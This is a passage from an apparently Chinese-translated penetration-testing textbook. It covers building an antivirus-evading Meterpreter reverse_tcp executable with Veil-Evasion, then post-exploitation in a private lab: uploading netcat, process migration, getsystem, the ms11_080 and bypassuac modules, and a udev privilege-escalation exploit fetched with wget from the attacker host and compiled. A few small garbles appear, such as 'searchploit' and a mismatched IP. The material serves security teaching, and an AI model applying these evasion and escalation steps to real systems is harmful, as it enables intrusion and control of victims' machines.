  \        generate payload\n    back            go to the main menu\n    exit   \
  \         exit Veil\n```\n\n默认情况下，此负载将使用 `VirtualAlloc()` 作为注入方法将 Python 脚本编译为可执行文件。这些选项对于我们的示例是正确的，因此在提示符输入\
  \ `generate`。随后你会被提示输入关于 shellcode 的详情，如 示例 12-12 所示。\n\n示例 12-12 在 Veil-Evasion\
  \ 中生成可执行文件\n\n```\n[?] Use msfvenom or supply custom shellcode?\n\n        1 - msfvenom\
  \ (default)\n        2 - Custom\n\n [>] Please enter the number of your choice:\
  \ 1\n\n [*] Press [enter] for windows/meterpreter/reverse_tcp\n [*] Press [tab]\
  \ to list available payloads\n [>] Please enter metasploit payload:\n [>] Enter\
  \ value for 'LHOST', [tab] for local IP: 192.168.20.9\n [>] Enter value for 'LPORT':\
  \ 2345\n [>] Enter extra msfvenom options in OPTION=value syntax:\n\n [*] Generating\
  \ shellcode...\n [*] Press [enter] for 'payload'\n [>] Please enter the base name\
  \ for output files: meterpreterveil\n\n [?] How would you like to create your payload\
  \ executable?\n\n        1 - Pyinstaller (default)\n        2 - Py2Exe\n\n [>] Please\
  \ enter the number of your choice: 1\n--snip--\n [*] Executable written to: /root/veil-output/compiled/meterpreterveil.exe\n\
  \n Language:    python\n Payload:    AESEncrypted\n Shellcode:    windows/meterpreter/reverse_tcp\n\
  \ Options:    LHOST=192.168.20.9  LPORT=2345\n Required Options:    compile_to_exe=Y\
  \  inject_method=virtual  use_pyherion=N\n Payload File:    /root/veil-output/source/preterveil.py\n\
  \ Handler File:    /root/veil-output/handlers/meterpreter_handler.rc\n\n [*] Your\
  \ payload files have been generated, don't get caught!\n [!] And don't submit samples\
  \ to any online scanner!\n```\n\nVeil-Evasion 提示你使用 msfvenom 生成 shellcode 还是提供自定义\
  \ shellcode。对于我们的目的，选择 msfvenom。默认负载是 `windows/meterpreter/reverse_tcp`，因此按回车选择它。会被提示输入常用的选项\
  \ `LHOST` 和 `LPORT`，以及可执行文件的文件名。最后，Veil-Evasion 提供了两种 Python 转可执行文件的方法。选择默认的 `Pyinstaller`，让\
  \ Veil-Evasion 生成恶意可执行文件并保存到 `veil-output/compiled` 目录。\n\n截至本文编写时，生成的可执行文件顺利绕过了我们\
  \ Windows 7 机器上的 Microsoft Security Essentials。Veil-Evasion 提到不要将生成的可执行文件上传到在线扫描器，因此根据作者的要求，我们将放弃使用\
  \ VirusTotal 测试此示例。不过，我们可以安装 Microsoft Security Essentials 之外的其他防病毒解决方案，查看该可执行文件是否被标记。\n\
  \n### 注意\n\n如果发现 Veil-Evasion 的可执行文件无法工作，你可能需要使用 `msupdate` 更新 Metasploit。由于 Veil-Evasion\
  \ 目前不在 Kali Linux 仓库中，你设置时下载的最新版本可能与 Kali 1.0.6 默认安装的 msfvenom 工作不匹配。当然，如果你使用 `msupdate`\
  \ 更新 Metasploit，书中的其他练习可能会发生变化，因为 Metasploit 的功能经常变化。因此，你可能想在第二次读本书时再进行此练习，或者如果你不想更新影响后面的练习，可以使用另一个\
  \ Kali Linux 镜像。\n\n\n\n\n\n或许避免杀毒软件的最佳方法是完全避开传统的载荷（payload）。如果你熟悉 Windows 编程，可以使用\
  \ `Windows APIs` 来模拟载荷的功能。当然，并没有规则规定合法应用程序不能与另一个系统建立 TCP 连接并发送数据——这本质上正是我们的 `windows/meterpreter/reverse_tcp`\
  \ 载荷所执行的操作。\n\n你可能会发现，与其使用 `Msfvenom` 生成载荷并尝试用本章介绍的方法将其隐藏，还不如直接编写一个执行你所需的载荷功能的 C\
  \ 程序，这样可以获得更好的效果。你甚至可以购买一个代码签名证书来为你的二进制可执行文件签名，使其看起来更合规。\n\n### 注意事项\n在进入后渗透测试（post\
  \ exploitation）阶段之前，请先关闭 `Microsoft Security Essentials` 中的实时保护。\n\n## 总结\n在本章中，我们只查看了少数几种绕过杀毒检测的技术。绕过杀毒解决方案的话题可以写成一整本书，而且等书籍出版时，它已经严重过时了。渗透人员和研究人员不断提出新技术来躲避杀毒检测，而杀毒软件供应商也一直在添加新的特征和启发式算法来捕获它们。\n\
  \n我们研究了使用 `Metasploit` 将载荷编码并嵌入到合法可执行文件中的。当我们发现这些技术不足以规避 `Microsoft Security Essentials`\
  \ 时，转向了 `Metasploit` 之外的技术。我们构建了一个自定义的可执行文件模板，并发现通过结合技术可以改进结果。\n\n我们最终通过使用 `Hyperion`\
  \ 实现了绕过 `Microsoft Security Essentials` 的目标。虽然我们从未达到 0% 的检测率，但我们成功绕过了 `Microsoft\
  \ Security Essentials` 以及其他几个顶级杀毒解决方案。我们还查看了另一个工具 `Veil-Evasion`，它结合 `VirtualAlloc`\
  \ 注入和加密来实现更好的规避。\n\n在学习了许多进入系统的方法（即使是那些没有明显漏洞的系统）之后，我们现在将转向进入系统后可以做什么，进入渗透测试的后渗透阶段。\n\
  \n## 第 13 章：后渗透\n我们已经获得了目标系统的访问权限，所以渗透测试结束了，对吧？我们可以告诉客户已经在他们的系统上获取了 shell。\n\n但那又如何呢？客户会在意吗？\n\
  \n在后渗透阶段，我们将查看对被渗透系统的信息收集、权限提升以及在系统之间的移动。也许我们发现自己可以访问存储在被渗透系统上的敏感数据，或者我们拥有访问其他系统的网络权限，可以利用它们进一步获取公司数据的权限。也许被渗透的系统是域的一部分，我们可以利用它访问域内的其他系统。这些只是后渗透阶段为我们开启的少数潜在途径。\n\
  \n后渗透可能是获取客户安全态清晰状况的最重要方式。例如，在[第 9 章]中，我提到过一次渗透测试，其中我通过访问一个退役的 `Windows 2000` 域控制器获得了对该域的完全管理控制。如果我没有使用后渗透技术，我可能会得出结论，认为\
  \ `Windows 2000` 系统没有存储敏感信息，且没有连接到域内的其他系统。我的渗透测试将不会那么成功，客户也无法对他们的漏洞有充分的了解，特别是在密码策略方面。\n\
  \n本章将涵盖后渗透的基础知识。当你离开这本书并提升你作为渗透人员的技能时，你应该在后渗透上花费大量时间。扎实的后渗透技能是将优秀的渗透人员与真正的大师区分开来。\n\
  \n现在让我们来看看 `Metasploit` 中的一些后渗透选项。\n\n## Meterpreter\n我们在[第 8 章]中讨论了 `Metasploit`\
  \ 的自定义载荷 `Meterpreter`。现在让我们深入探讨并查看 `Meterpreter` 的一些功能。\n\n我们将通过在每个目标系统上开启 `Meterpreter`\
  \ 会话来开始后渗透。如[示例 13-1]所示，我通过 `MS08-067` 漏洞在 `Windows XP` 目标上建立了会话。在 `Windows 7` 目标上，我使用了类似于上一章使用的木马可执行文件。在\
  \ Linux 目标上，我使用了我们在[第 8 章]中利用的 `TikiWiki` `PHP` 漏洞。你也可以通过开放的 `NFS` 共享，使用我们在[第 9\
  \ 章]中破解的 `georgia` 密码（password）或我们在[第 8 章]中添加的 `SSH` 公钥来登录 Linux 目标。\n\n示例 13-1.\
  \ 在我们的目标上开启 Metasploit 会话\n\n```\nmsf > sessions -l\n\nActive sessions\n===============\n\
  \n  Id  Type                   Information                            Connection\n\
  \  --  ----                   -----------                            ----------\n\
  \  1   meterpreter x86/win32  NT AUTHORITY\\SYSTEM @ BOOKXP           192.168.20.9:4444\
  \ ->\n                                                                      192.168.20.10:1104\n\
  \                                                                      (192.168.20.10)\n\
  \  2   meterpreter x86/win32  Book-Win7\\Georgia Weidman @ Book-Win7  192.168.20.9:2345\
  \ ->\n                                                                      192.168.20.12:49264\n\
  \                                                                      (192.168.20.12)\n\
  \  3   meterpreter php/php    www-data (33) @ ubuntu                 192.168.20.9:4444\
  \ ->\n                                                                      192.168.20.11:48308\n\
  \                                                                      (192.168.20.11)\n\
  ```\n\n如所示，首先与你的 `Windows XP` 会话交互。\n\n```\nmsf post(enum_logged_users) > sessions\
  \ -i 1\n```\n\n我们在整书中已经见过几个 `Meterpreter` 命令。具体来说，在[第 9 章]中，我们使用 `hashdump` 获取[离线攻击]中的本地密码哈希。要查看\
  \ `Meterpreter` 命令列表，请输入 `help`。要获取特定命令的详细信息，请输入 `command -h`。\n\n### 使用 upload\
  \ 命令\n在渗透测试中，可能没有比自己在一个 Windows 机器上没有 `wget` 或 `curl` 等从服务器下载文件的工具更痛苦的。在[第 8 章]中，我们看到了使用\
  \ `TFTP` 解决这个问题的方法，但 `Meterpreter` 轻松地为我们解决了。通过简单的命令 `help upload`，我们可以将文件上传到目标，如[示例\
  \ 13-2]所示。\n\n示例 13-2. Meterpreter help 命令\n\n```\nmeterpreter > help upload\nUsage:\
  \ upload [options] src1 src2 src3 ... destination\n\n将本地文件和目录上传到远程机器。\n\nOPTIONS:\n\
  \n    -h        帮助横幅。\n    -r        递归上传。\n```\n\n这些帮助信息告诉我们，可以使用 `upload` 将文件从\
  \ Kali 系统复制到 `Windows XP` 目标。\n\n例如，以下是上传 Windows 版 Netcat 的方法：\n\n```\nmeterpreter\
  \ > upload /usr/share/windows-binaries/nc.exe C:\\\\\n[*] uploading  : /usr/share/windows-binaries/nc.exe\
  \ -> C:\\\n[*] uploaded   : /usr/share/windows-binaries/nc.exe -> C:\\\\nc.exe\n\
  ```\n\n\n\n\n\n记得在路径中使用第二个反斜杠对反斜杠字符进行转义。还要记住，如果你在渗透测试期间向目标上传了任何内容或更改了目标系统，请记录你的更改，以便在任务结束前撤销它们。你最不希望做的就是让环境变得比你发现它时更加脆弱。\n\
  \n### getuid\n\n另一个实用的 Meterpreter 命令是 `getuid`。此命令会告诉你运行 Meterpreter 的 `System`\
  \ 用户的名称。通常情况下，Meterpreter 以被利用的进程或用户的权限运行。\n\n例如，当我们使用 `MS08-067` 漏洞利用 SMB 服务器时，我们在目标机器上运行的权限是\
  \ SMB 服务器的权限，即 Windows `System` 账户，如下所示。\n\n```\nmeterpreter > getuid\nServer username:\
  \ NT AUTHORITY\\SYSTEM\n```\n\n在 Windows 7 目标机上，我们通过社会工程学手段诱导用户运行了一个带有木马的程序，该程序连接回\
  \ Metasploit，因此 Meterpreter 是以用户 `Georgia Weidman` 的身份运行的。\n\n### 其他 Meterpreter\
  \ 命令\n\n在继续之前，请花些时间尝试额外的 Meterpreter 命令。你会发现许多用于本地信息收集、远程控制甚至监视本地用户的有用命令，例如键盘记录器和从\
  \ Meterpreter 会话中开启摄像头。\n\n## Meterpreter 脚本\n\n除了 Meterpreter 命令外，你还可以从 Meterpreter\
  \ 控制台运行 Meterpreter 脚本。目前这些脚本可以在 Kali 的 `/usr/share/metasploit-framework/scripts/meterpreter*`\
  \ 找到。这些脚本是用 Ruby 编写的，你可以编写自己的脚本并提交纳入框架。要使用 Meterpreter 脚本，请输入 `run <script name>`。使用\
  \ `-h` 标志查看脚本的帮助信息。\n\n在第 10 章 中利用 Internet Explorer 时，我们使用了 `AutoRunScript` 选项自动运行\
  \ `migrate` 脚本，在浏览器崩溃之前产生新进程并迁移其中。我们也可以直接在 Meterpreter 内部运行此脚本。例如，输入 `run migrate\
  \ -h`（如示例 13-3 所示），可以获得关于 `migrate` Meterpreter 脚本的信息。\n\n示例 13-3. Migrate 脚本帮助信息\n\
  \n```\nmeterpreter > run migrate -h\n\nOPTIONS:\n\n    -f        启动一个进程并迁移到新进程\n\
  \    -h        帮助菜单。\n    -k        杀死原始进程。\n    -n <opt>  迁移到具有此可执行文件名称 (explorer.exe)\
  \ 的第一个进程\n    -p <opt>  要迁移到的 PID。\n```\n\n由于我们并不急于在会话关闭之前抢先，因此对于迁移到哪个进程有几个不同的选项。我们可以使用\
  \ `-n` 选项按名称迁移到进程。例如，要迁移到进程列表中遇到的第一个 `explorer.exe` 实例，我们可以使用 `-n explorer.exe`。\n\
  \n你也可以使用 `-p` 选项通过其进程 ID (PID) 迁移到进程。使用 Meterpreter 的 `ps` 命令查看运行进程列表，如示例 13-4 所示。\n\
  \n示例 13-4. 运行进程列表\n\n```\nmeterpreter > ps\n\nProcess List\n============\n\n PID\
  \   PPID  Name              Arch  Session     User                    Path\n ---\
  \   ----  ----              ----  -------     ----                    ----\n 0 \
  \    0     [System Process]        4294967295\n 4     0     System            x86\
  \   0           NT AUTHORITY\\SYSTEM\n--snip--\n 1144  1712  explorer.exe      x86\
  \   0           BOOKXP\\georgia          C:\\WINDOWS\\Explorer.EXE\n--snip--\n 1204\
  \  1100  wscntfy.exe       x86   0           BOOKXP\\georgia\n```\n\n`Explorer.exe`\
  \ 是一个可靠的选择。为 `explorer.exe` 选择 PID `1144`，并运行 Meterpreter `migrate` 脚本，如示例 13-5\
  \ 所示。\n\n示例 13-5. 运行 migrate 脚本\n\n```\nmeterpreter > run migrate -p 1144\n[*] Migrating\
  \ from 1100 to 1144...\n[*] Migration completed successfully.\nmeterpreter > getuid\n\
  Server username: BOOKXP\\georgia\n```\n\nMeterpreter 成功迁移到 `explorer.exe` 进程。现在，如果\
  \ SMB 服务器恰好变得不稳定或崩溃，我们的 Meterpreter 会话就是安全的。\n\n如果你再次运行 `getuid` 命令，你会发现我们不再以 `System`\
  \ 用户身份运行，而是以用户 `georgia` 的身份运行。这是合理的，因为该进程属于登录用户 `georgia`。通过移动到此进程，我们实际上有效地将权限降低到了用户\
  \ `georgia`。\n\n让我们继续在 XP 目标机上以用户 `georgia` 的身份保持登录，并查看一些通过本地权限提升攻击将 Windows 目标权限提升到\
  \ `System` 以及将 Linux 目标权限提升到 `root` 的方法。\n\n## Metasploit 后渗透模块\n\n到目前为止，我们使用 Metasploit\
  \ 模块进行信息收集、漏洞识别和利用。这并不令人意外，该框架在后渗透阶段也有许多实用的模块。Metasploit 的 `post` 目录包含用于本地信息收集、远程控制、权限提升等模块，跨越了多个平台。\n\
  \n例如，考虑模块 `post/windows/gather/enum_logged_on_users`。如示例 13-6 所示，该模块将显示哪些用户当前登录到目标系统。将你的会话放入后台（使用\
  \ ctrl-Z 或 `background`）返回主 Msfconsole 提示符。\n\n示例 13-6. 运行 Metasploit 后模块\n\n```\n\
  msf > use post/windows/gather/enum_logged_on_users\nmsf post(enum_logged_on_users)\
  \ > show options\n\nModule options (post/windows/gather/enum_logged_on_users):\n\
  \n   Name     Current Setting  Required  Description\n   ----     ---------------\
  \  --------  -----------\n   CURRENT  true             yes       列举当前登录的用户\n   RECENT\
  \   true             yes       列举最近登录的用户\n  SESSION                   yes      \
  \ 运行此模块的会话。\nmsf post(enum_logged_on_users) > set SESSION 1\nSESSION => 1\nmsf post(enum_logged_on_users)\
  \ > exploit\n\n[*] Running against session 1\n\nCurrent Logged Users\n====================\n\
  \n SID                                          User\n ---                     \
  \                     ----\n S-1-5-21-299502267-30823625-682003330-1003  BOOKXP\\\
  georgia\n\n[*] Results saved in: /root/.msf4/loot/20140324121217_default_192.168.20.10_host.users.activ\n\
  _791806.txt ❷\n\nRecently Logged Users\n=====================\n\n SID          \
  \                                Profile Path\n ---                            \
  \              ------------\n S-1-5-18                                     %systemroot%\\\
  system32\\config\\systemprofile\n S-1-5-19                                     %SystemDrive\\\
  Documents and Settings\\LocalService\n S-1-5-20                                \
  \     %SystemDrive\\Documents and Settings\\NetworkService\n S-1-5-21-299502267-30823625-682003330-1003\
  \  %SystemDrive\\Documents and Settings\\georgia\n```\n\n我们使用后模块的方式就像使用所有 Metasploit\
  \ 模块一样：设置相关的选项，然后输入 `exploit` 运行模块。然而，在后渗透模块的情况下，我们不需要设置 `RHOST` 或 `SRVHOST`，而是需要告诉\
  \ Metasploit 我们想要运行后渗透模块的会话 ID ❶。然后我们针对会话 1（即 Windows XP 目标机）运行模块。\n\n\n\n\n\nRailgun\
  \ 是 Meterpreter 的一个扩展，允许直接访问 Windows API。它可以用于 Meterpreter 的后渗透模块中，也可以用于在 Meterpreter\
  \ 会话的 Ruby shell (`irb`) 中。例如，我们可以通过直接访问 Windows DLL `shell32` 中的 `IsUserAnAdmin`\
  \ 函数来检查会话是否以管理员用户身份运行，如下所示。请确保先使用 `sessions -i` `<session id>` 将会话置于前。\n\n```\n\
  meterpreter > irb\n[*] Starting IRB shell\n[*] The 'client' variable holds the meterpreter\
  \ client\n>> client.railgun.shell32.IsUserAnAdmin\n=> {\"GetLastError\"=>0, \"Error\
  \ Message\"=>\"The operation completed successfully.\", \"return\"=>true}\n```\n\
  \n首先，我们使用命令 `irb` 进入 Ruby shell。注意 `client` 变量持有 Meterpreter 客户端。接下来，我们输入 `client.railgun.shell32.IsUserAnAdmin`，告诉\
  \ Ruby 解释器在当前 Meterpreter 会话上使用 Railgun 并访问 `shell32.dll` 中的 `IsUserAdmin` 函数。（如需查看更多\
  \ Railgun 示例，请查看 Metasploit 后渗透模块，如 `windows/gather/reverse_lookup.rb` 和 `windows/manage/download_exec.rb`，它们也利用了这一功能。）输入\
  \ `exit` 退出 Ruby 解释器并返回 Meterpreter。\n\n## 本地权限提升\n\n在接下来的章节中，我们将探索本地权限提升示例，这涉及到在渗透后运行利用程序以获取系统的更多控制权。\n\
  \n网络软件和客户端软件一样，特权本地进程也可能存在可利用的安全漏洞。你的某些攻击可能无法获得你想要的权限。通过网站获取命令执行权限、攻破没有管理员权限的用户账户或利用权限限制的监听服务都可能导致系统访问，但你可能会发现自己仍然以受限用户的身份运行。为了获得我们想要的权限，我们需要进一步利用其他漏洞。\n\
  \n### Windows 上的 getsystem\n\nMeterpreter 的 `getsystem` 命令会自动对目标尝试一系列已知的本地权限提升利用。该命令的选项如示例\
  \ 13-7](#ch13.html_getsystem_help \"示例 13-7. getsystem 帮助\") 所示。\n\n示例 13-7. `getsystem`\
  \ 帮助\n\n```\nmeterpreter > getsystem -h\nUsage: getsystem [options]\n\nAttempt to\
  \ elevate your privilege to that of local system.\n\nOPTIONS:\n\n    -h Help Banner.\n\
  \    -t <opt>  要使用的技术。（默认值为 '0'）。\n        0 : 所有可用技术\n        1 : Service - Named\
  \ Pipe Impersonation (In Memory/Admin)\n        2 : Service - Named Pipe Impersonation\
  \ (Dropper/Admin)\n        3 : Service - Token Duplication (In Memory/Admin)\n```\n\
  \n如下所示，不带参数运行 `getsystem` 将运行一系列本地利用程序，直到某个成功或所有已知利用程序用尽。要运行特定的利用程序，请使用 `-t` 选项后跟利用编号。\n\
  \n在这里我们在 Windows XP 目标上不带参数运行 `getsystem`。\n\n```\nmeterpreter > getsystem\n...got\
  \ system (via technique 1).\nmeterpreter > getuid\nServer username: NT AUTHORITY\\\
  SYSTEM\n```\n\n如你所见，Meterpreter 通过尝试的第一个利用程序获得了系统权限。通过一个命令，我们就能将权限从 `georgia` 提升到\
  \ `System`。\n\n### Windows 本地提升模块\n\n###asploit 中的本地利用模块允许你在打开的会话上运行利用程序以获得额外的访问。示例\
  \ 13-8](#ch13.html_metasploit_local_exploit \"示例 13-8. Metasploit 本地利用\") 中的本地权限提升模块\
  \ `exploit/windows/local/ms11_080_afdjoinleaf` 利用了 Windows 驱动 `afd.sys` 中 `Afdjoinleaf`\
  \ 函数的一个（现已修复）漏洞。与后渗透模块一样，使用 `SESSION` 选项指定要在哪个打开的会话上运行利用程序。我们将针对 Windows XP 会话运行该模块。与后渗透模块不同，本地利用意味着我们需要设置\
  \ payload。如果成功，我们的利用程序将打开一个具有 System 权限的新会话。在你的 Windows XP Meterpreter 会话中，在使用这种替代权限提升技术之前，运行\
  \ `rev2self` 命令回到用户 `georgia`。\n\n示例 13-8. Metasploit 本地利用\n\n```\nmsf post(enum_logged_on_users)\
  \ > use exploit/windows/local/ms11_080_afdjoinleaf\nmsf exploit(ms11_080_afdjoinleaf)\
  \ > show options\n\nModule options (exploit/windows/local/ms11_080_afdjoinleaf):\n\
  \n   Name     Current Setting  Required  Description\n   ----     ---------------\
  \  --------  -----------\n   SESSION                   yes       运行此模块的会话。\n--snip--\n\
  msf exploit(ms11_080_afdjoinleaf) > set SESSION 1\nSESSION => 1\nmsf exploit(ms11_080_afdjoinleaf)\
  \ > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\n\
  msf exploit(ms11_080_afdjoinleaf) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\n\
  msf exploit(ms11_080_afdjoinleaf) > exploit\n\n[*] Started reverse handler on 192.168.20.9:4444\n\
  [*] Running against Windows XP SP2 / SP3\n--snip--\n[*] Writing 290 bytes at address\
  \ 0x00f70000\n[*] Sending stage (751104 bytes) to 192.168.20.10\n[*] Restoring the\
  \ original token...\n[*] Meterpreter session 4 opened (192.168.20.9:4444 -> 192.168.20.10:1108)\
  \ at 2015-08-14 01:59:46 -0400\n\nmeterpreter >\n```\n\n在你输入 `exploit` 后，Metasploit\
  \ 在我们的 Windows XP 会话中运行利用程序。如果成功，你应该收到另一个 Meterpreter 会话。如果你在这个新会话上运行 `getuid`，你应该看到你再次获得了\
  \ System 权限。\n\n### 注意事项\n\n记住，本地权限提升攻击的成功取决于缺失补丁或安全配置错误等漏洞。完全更新并加固的系统不会受到 MS11-08\
  \ 漏洞的影响，因为厂商在 2011 年发布了补丁。\n\n### 绕过 Windows 上的 UAC\n\n现在让我们看看如何在更安全的 Windows 7\
  \ 目标上提升权限，该目标具有额外的安全功能，包括用户账户控制 (UAC)。运行在 Windows Vista 及更高版本上的应用程序被限制使用普通用户权限。如果应用程序需要使用管理员权限，则必须由管理员用户批准提升。（你可能在应用程序想要进行更改时看到过\
  \ UAC 的警告通知。）\n\n由于我们是通过让用户 `Georgia Weidman` 运行恶意二进制文件获取此会话，目前 Meterpreter 会话拥有\
  \ Georgia Weidman 的权限。尝试对该目标使用 `getsystem`，如示例 13-9](#ch13.html_getsystem_fails_on_windows_7\
  \ \"示例 13-9. getsystem 在 Windows 7 上失败\")所示。\n\n示例 13-9. `getsystem` 在 Windows 7\
  \ 上失败\n\n```\nmsf exploit(ms11_080_afdjoinleaf) > sessions -i 2\n[*] Starting interaction\
  \ with 2...\nmeterpreter > getuid\nServer username: Book-Win7\\Georgia Weidman\n\
  meterpreter > getsystem\n[-] priv_elevate_getsystem: Operation failed: Access is\
  \ denied.\n```\n\n如你所见，对该目标运行 `getsystem` 失败并返回错误信息。也许该系统已完全补丁并加固，导致 `getsystem`\
  \ 中的所有利用技术都无效。\n\n但事实证明，我们的 Windows 7 目标自安装以来尚未补丁；UAC 阻止了 `getsystem` 的正常工作。\n\n\
  正如任何计算机安全控制一样，研究人员开发了多种绕过 UAC 控制的技术。其中一种技术包含在 Metasploit 的本地利用程序 `windows/local/bypassuac`\
  \ 中。将会话后台并在并在 Windows 7 会话上运行该利用程序，如示例 13-10](#ch13.html_using_a_module_to_bypass_the_uac_control\
  \ \"示例 13-10. 使用模块绕过 UAC\") 所示。使用利用模块，设置 `SESSION` 选项等。\n\n示例 13-10. 使用模块绕过 UAC\n\
  \n\n\n\n\n```\nmsf exploit(ms11_080_afdjoinleaf) > use exploit/windows/local/bypassuac\n\
  msf exploit(bypassuac) > show options\n\nModule options (exploit/windows/local/bypassuac):\n\
  \n   Name     Current Setting  Required  Description\n   ----     ---------------\
  \  --------  -----------\n   SESSION                   yes       The session to\
  \ run this module\nmsf exploit(bypassuac) > set SESSION 2\nSESSION => 2\nmsf exploit(bypassuac)\
  \ > exploit\n\n[*] Started reverse handler on 192.168.20.9:4444\n[*] UAC is Enabled,\
  \ checking level...\n--snip--\n[*] Uploaded the agent to the filesystem....\n[*]\
  \ Sending stage (751104 bytes) to 192.168.20.12\n[*] Meterpreter session 5 opened\
  \ (192.168.20.9:4444 -> 192.168.20.12:49265) at 2015-08-14 02:17:05 -0400\n[-] Exploit\
  \ failed: Rex::TimeoutError Operation timed out. ❶\n\nmeterpreter > getuid\nServer\
  \ username: Book-Win7\\Georgia Weidman\n```\n\n该模块通过进程注入使用受信任发布者证书来绕过 UAC 控制。从 `getuid`\
  \ 命令的结果可以看出，尽管我们的新会话仍以用户 `Georgia Weidman` 的身份运行，但我们不再受 UAC 限制。如果成功，你将再次看到一个新的会话。如果你看到\
  \ ❶ 处的那行，不要担心。只要新的 Meterpreter 会话打开，攻击就是成功的。\n\n接下所示，在排除 UAC 障碍后，`getsystem` 能够轻松获取系统级权限。\n\
  \n```\nmeterpreter > getsystem\n...got system (via technique 1).\n```\n\n## Linux\
  \ 上的 Udev 权限提升\n\n我们还没有尝试对 Linux 目标进行权限提升。让我们换种花样，使用公开的漏洞代码而不是 Metasploit 来在 Linux\
  \ 上执行本地权限提升攻击。\n\n我们有两种方法与 Linux 目标交互：通过 SSH 以及使用 TikiWiki 获取 Meterpreter shell。Linux\
  \ 版 Meterpreter 的可用命令比 Windows 版少，但在这两种情况下，我们都使用 `shell` 命令来退出 Meterpreter 并进入常规命令\
  \ shell，如 示例 13-11 所示。\n\n### 示例 13-11. 在 Meterpreter 中进入 shell\n\n```\nmeterpreter\
  \ > shell\nProcess 13857 created.\nChannel 0 created.\nwhoami\nwww-data\n```\n\n\
  我们看到 TikiWiki 漏洞为我们获取了一个名为 `www-data` 用户的会话，这是一个 Web 服务器的受限账户，但要到达 root 还有很长的路要走。我们通过\
  \ SSH 在 第 8 章 中获得了一个名为 `georgia` 用户的 Bash shell，其权限比 `www-data` 高，但我们仍然不是梦寐以求的 root。\n\
  \n### 寻找漏洞\n\n我们需要找到一个可以利用的本地权限提升漏洞。首先，我们需要一些关于本地系统的信息，例如已安装的内核版本和 Ubuntu 版本。你可以通过\
  \ `uname -a` 命令查看 Linux 内核版本，通过 `lsb_release -a` 命令查看 Ubuntu 发布版本，如 示例 13-12 所示。\n\
  \n### 示例 13-12. 收集本地信息\n\n```\nuname -a\nLinux ubuntu 2.6.27-7-generic #1 SMP Fri\
  \ Oct 24 06:42:44 UTC 2008 i686 GNU/Linux\nlsb_release -a\nDistributor ID: Ubuntu\n\
  Description: Ubuntu 8.10\nRelease: 8.10\nCodename: intrepid\n```\n\nLinux 目标运行着\
  \ Linux 内核 2.6.27-2 和 Ubuntu 8.10，代号为 `Intrepid`。这个 Linux 系统有点过时，容易受到多个已知的权限提升问题。我们将关注\
  \ `udev` 中的一个问题，它是 Linux 内核的设备管理器，负责加载设备驱动程序或便于控制设备的软件。\n\n漏洞 CVE-2009-1185 描述了\
  \ udev 中的一个问题，以 root 权限运行的守护进程未能检查加载驱动程序的请求是否来自内核。用户空间的进程（例如用户启动的进程）可以向 udev 发送消息并说服它以\
  \ root 权限运行代码。\n\n根据 *SecurityFocus.com* 关于该漏洞的条目，Ubuntu 8.10 是受影响的平台，进一步挖掘发现 udev\
  \ 版本 141 及更早版本受此问题影响。可以通过 `udevadm --version` 命令检查目标上的 udev 版本，但我们无法以 `www-data`\
  \ 权限运行该命令。相反，我们需要像这里这样在 SSH shell 中运行它。\n\n```\ngeorgia@ubuntu:~$ udevadm --version\n\
  124\n```\n\n我们目标上的 udev 版本是 124。由于目标上的 udev 版本早于 141，该 Linux 系统存在漏洞。\n\n### 寻找漏洞\n\
  \n这里似乎有多个针对该问题的公开漏洞。*Exploit.com* 包含了 `/usr/share/exploitdb` 中相关的漏洞。\n\n### 注意事项\n\
  \n在尝试目标公开漏洞之前，务必充分了解公开代码在做什么。此外，始终可能某些公开漏洞在目标上无法运行。\n\n### 获取漏洞\n\nKali 包含一个名为 `searchploit`\
  \ 的工具，我们可以用它搜索漏洞。例如，示例 13-13 显示了针对 udev 的漏洞。\n\n### 示例 13-13. 搜索漏洞库\n\n```\nroot@kali:~#\
  \ searchploit udev\n------------------------------------------------------\nDescription\
  \                                           Path\n------------------------------------------------------\n\
  2009-1185   - udev local privilege escalation (linux)  /usr/share/exploitdb/21848.rb\n\
  ```\n\n\n\n\n\n示例 13-15. 使用 `wget` 下载文件\n\n```\ngeorgia@ubuntu:~$ wget http://192.168.20.9/8572.c\n\
  --2015-08-14 14:30:51--  http://192.168.20.9/8572.c\nConnecting to 10.0.1.24:80...\
  \ connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 2768 (2.7K)\
  \ [text/x-csrc]\nSaving to: '8572.c'\n\n100%[======================================>]\
  \ 2,768       --.-K/s   in 0s\n\n2015-08-14 14:30:52 (271 MB/s) - '8572.c' saved\
  \ [2768/2768]\n```\n\n现在在 Linux 目标机器上使用 `GCC` 编译漏洞代码，如这里所示。使用 `-o` 标记指定编译代码的输出文件名。\n\
  \n```\ngeorgia@ubuntu:~$ gcc -o exploit 8572.c\n```\n\n现在我们需要找到漏洞利用用法信息中提到的 `udev`\
  \ netlink  socket PID（示例 13-14）作为我们的参数。用法信息指出，我们需要 PID 列在 `/proc/net/netlink` 中。使用\
  \ `cat` 输出该文件，如示例 13-16]所示。\n\n### 示例 13-16. `/proc/net/netlink` 文件\n\n```\ngeorgia@ubuntu:~$\
  \ cat /proc/net/netlink\nsk       Eth Pid     Groups   Rmem     Wmem     Dump  \
  \   Locks\nf7a90e00 0   5574    0000111 0        00000000 2\nda714400 0   6476 \
  \   00000001 0        00000000 2\nda714c00 0   4200780 00000000 0        00000000\
  \ 2\n--snip--\nf7842e00 15  2468    00000001 0        00000000 2\nf75d5c00 16  0\
  \       00000000 0        00000000 2\nf780f600 18  0       00000000 0        00000000\
  \ 2\n```\n\n列出的 PID 有多个，但我们知道需要的 PID 通常是 `udev` 守护进程的 PID 减 1。使用 `ps aux` 命令查看 `udev`\
  \ 进程，如这里所示。\n\n```\ngeorgia@ubuntu:~$ ps aux | grep udev\nroot      2469  0.0  0.0\
  \   2452   980 ?        S  02:27 /sbin/udev --daemon\ngeorgia   3751  0.0  0.0 \
  \  3236   792 pts/1    S+   14:36   0:00 grep udev\n```\n\n`udev` 守护进程的 PID 是 `2469`。示例\
  \ 13-16 中的 PID 之一是 `2468`（udev 的 PID 减 1）。根据漏洞的帮助信息，这就是我们需要的值。该值会在 Ubuntu 目标重启之间发生变化，因此请确保在自己的实验室中运行这些命令以找到正确的值。\n\
  \n#### 向 `/tmp/run` 文件添加代码\n\n我们最后需要的是 `/tmp/run` 文件中以 `root` 身份运行的代码。幸运的是，我们的 Ubuntu\
